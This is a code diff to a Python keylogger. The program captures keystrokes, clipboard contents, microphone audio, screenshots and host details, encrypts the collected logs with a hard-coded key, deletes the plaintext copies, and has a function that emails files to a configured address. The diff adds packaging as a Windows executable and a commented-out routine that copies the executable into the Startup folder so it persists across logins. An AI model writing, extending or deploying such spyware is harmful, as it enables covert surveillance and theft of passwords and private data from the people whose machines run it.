@@ -13,6 +13,8 @@ from pynput.keyboard import Key, Listener
 
 import time
 import os
+import sys
+import shutil
 from dotenv import load_dotenv
 import logging
 from scipy.io.wavfile import write
@@ -39,10 +41,14 @@ TO_ADDR = os.getenv('TO_ADDR')
 
 username = getpass.getuser()
 
-# File paths
-file_path = "C:\\Users\\SOC\\PycharmProjects\\pythonKeylogger\\Project"
-extend = "\\"
-file_merge = file_path + extend
+
+# Determine the current directory (works both for scripts and .exe)
+if getattr(sys, 'frozen', False):
+    # If the script is running as a bundled .exe (PyInstaller)
+    file_merge = os.path.join(sys._MEIPASS, "")  # Temporary folder where PyInstaller extracts the app
+else:
+    # If running from the source code (e.g., during development)
+    file_merge = os.getcwd()  # Use the current working directory
 
 # Encryption Key
 KEY = "j8m2foeb9665zwiyqZDLi3w9WB-LC3yRak0Cw7Ge9HQ="
@@ -82,7 +88,7 @@ def send_email(filename, attachment, from_addr, to_addr):
 def computer_information():
     """Collect computer information (hostname, IP address, etc.)"""
     try:
-        with open(file_merge + "systeminfo.txt", "a") as f:
+        with open(os.path.join(file_merge + "systeminfo.txt"), "a") as f:
             hostname = socket.gethostname()
             IPAddr = socket.gethostbyname(hostname)
             try:
@@ -104,7 +110,7 @@ def computer_information():
 def copy_clipboard():
     """Collect clipboard data"""
     try:
-        with open(file_merge + "clipboard.txt", "a") as f:
+        with open(os.path.join(file_merge + "clipboard.txt"), "a") as f:
             win32clipboard.OpenClipboard()
             pasted_data = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
@@ -122,7 +128,7 @@ def microphone():
     try:
         my_recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
         sd.wait()
-        write(file_merge + "audio.wav", fs, my_recording)
+        write(os.path.join(file_merge + "audio.wav"), fs, my_recording)
         logging.info("Audio recorded.")
     except Exception as e:
         logging.error(f"Error recording audio: {e}")
@@ -132,7 +138,7 @@ def screenshot():
     """Capture a screenshot of the screen"""
     try:
         im = ImageGrab.grab()
-        im.save(file_merge + "screenshot.png")
+        im.save(os.path.join(file_merge + "screenshot.png"))
         logging.info("Screenshot taken.")
     except Exception as e:
         logging.error(f"Error capturing screenshot: {e}")
@@ -149,30 +155,50 @@ def keylogger():
         keys.append(key)
         count += 1
 
-        if count >= 10: # write every 10 keystrokes
+        if count >= 100: # write every 10 keystrokes
             write_keys_to_file(keys)
             keys = []
             count = 0
 
     def on_release(key):
-        if key == Key.esc:
-            return False
+        try:
+            if key == Key.esc:
+                logging.info("Escape key pressed. Stopping listener.")
+                return False  # Stop the listener
+        except Exception as e:
+            logging.error(f"Error in on_release: {e}")
 
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
 
-
 def write_keys_to_file(keys):
     """Write keys to a file"""
     try:
-        with open(file_merge + "key_log.txt", "a") as f:
+        with open(os.path.join(file_merge + "key_log.txt"), "a") as f:
             for key in keys:
-                k = str(key).replace("'", "")
+                k = str(key).replace("'", "") # Convert key to a string and remove quote
+
                 if "space" in k:
-                    f.write(" ")
-                elif "Key" not in k:
+                    f.write(" ")  # Write a space for the spacebar
+                elif "enter" in k:
+                    f.write("\n")  # Write a new line for the Enter key
+                elif "backspace" in k:
+                    f.write("[BACKSPACE]")  # Indicate backspace
+                elif "shift" in k:
+                    f.write("[SHIFT]")  # Indicate Shift key
+                elif "ctrl" in k:
+                    f.write("[CTRL]")  # Indicate Control key
+                elif "alt" in k:
+                    f.write("[ALT]")  # Indicate Alt key
+                elif "caps" in k:
+                    f.write("[CAPSLOCK]")  # Indicate Caps Lock key
+                elif "esc" in k:
+                    f.write("[ESC]")  # Indicate Escape key
+                else:
+                    # For regular alphanumeric keys, just write the key value
                     f.write(k)
+
         logging.info("Keystrokes logged.")
     except Exception as e:
         logging.error(f"Error writing keystrokes: {e}")
@@ -181,8 +207,20 @@ def write_keys_to_file(keys):
 def encrypt_files():
     """Encrypt collected files"""
     try:
-        files_to_encrypt = [file_merge + "key_log.txt", file_merge + "clipboard.txt", file_merge + "systeminfo.txt"]
-        encrypted_file_names = [file_merge + "e_key_log.txt", file_merge + "e_clipboard.txt", file_merge + "e_systeminfo.txt"]
+        files_to_encrypt = [
+            os.path.join(file_merge + "key_log.txt"),
+            os.path.join(file_merge + "clipboard.txt"),
+            os.path.join(file_merge + "systeminfo.txt"),
+            os.path.join(file_merge + "keylogger.log")
+        ]
+
+        encrypted_file_names = [
+            os.path.join(file_merge + "e_key_log.txt"),
+            os.path.join(file_merge + "e_clipboard.txt"),
+            os.path.join(file_merge + "e_systeminfo.txt"),
+            os.path.join(file_merge + "e_keylogger.log")
+        ]
+
         fernet = Fernet(KEY)
 
         for original, encrypted in zip(files_to_encrypt, encrypted_file_names):
@@ -204,9 +242,9 @@ def encrypt_files():
 def delete_files():
     """Delete sensitive files after encryption"""
     try:
-        os.remove(file_merge + "key_log.txt")
-        os.remove(file_merge + "clipboard.txt")
-        os.remove(file_merge + "systeminfo.txt")
+        os.remove(os.path.join(file_merge + "key_log.txt"))
+        os.remove(os.path.join(file_merge + "clipboard.txt"))
+        os.remove(os.path.join(file_merge + "systeminfo.txt"))
         logging.info("Sensitive files deleted.")
     except Exception as e:
         logging.error(f"Error deleting files: {e}")
@@ -230,6 +268,19 @@ def main():
         logging.error(f"Unexpected error: {e}")
 
 
+# def add_to_startup():
+#     """Add the executable to the Windows Startup folder for auto-start on login"""
+#     startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+#     current_exe_path = os.path.abspath(sys.argv[0])
+#
+#     try:
+#         shutil.copy(current_exe_path, startup_folder)
+#         print(f"Successfully added to Startup: {current_exe_path}")
+#     except Exception as e:
+#         print(f"Error adding to Startup: {e}")
+
+
 if __name__ == "__main__":
+        # add_to_startup()
         main()
 
